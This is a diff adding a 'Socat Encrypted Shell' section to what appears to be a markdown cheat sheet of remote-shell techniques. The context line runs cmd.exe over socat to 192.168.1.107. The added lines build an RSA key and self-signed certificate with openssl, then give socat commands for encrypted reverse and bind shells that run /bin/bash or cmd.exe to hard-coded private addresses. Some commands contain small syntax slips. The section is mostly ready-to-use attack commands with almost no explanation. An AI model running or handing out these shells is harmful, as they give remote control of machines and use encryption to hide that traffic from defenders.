@@ -42,3 +42,19 @@ socat - TCP4:192.168.1.107:1337 EXEC:cmd.exe
 ```
 ![screen](https://user-images.githubusercontent.com/92652606/144711614-8cb7efd5-d811-496a-aca0-1e334362ae33.png)
 
+* ***Socat Encrypted Shell***
+
+```shell
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt # make the key file and crt file using rsa 2048 
+
+```
+```shell
+cat shell.key shell.crt > shell.pem 
+
+```
+```shell
+socat OPENSSL:192.168.1.1:4444, verify=0 EXEC:/bin/bash # connect to 192.168.1.1 on port 4444 using openssl
+```
+```shell
+socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes # bind shell
+socat OPENSSL:192.168.1.120:4444,verify= 0 # connect to the target machine 
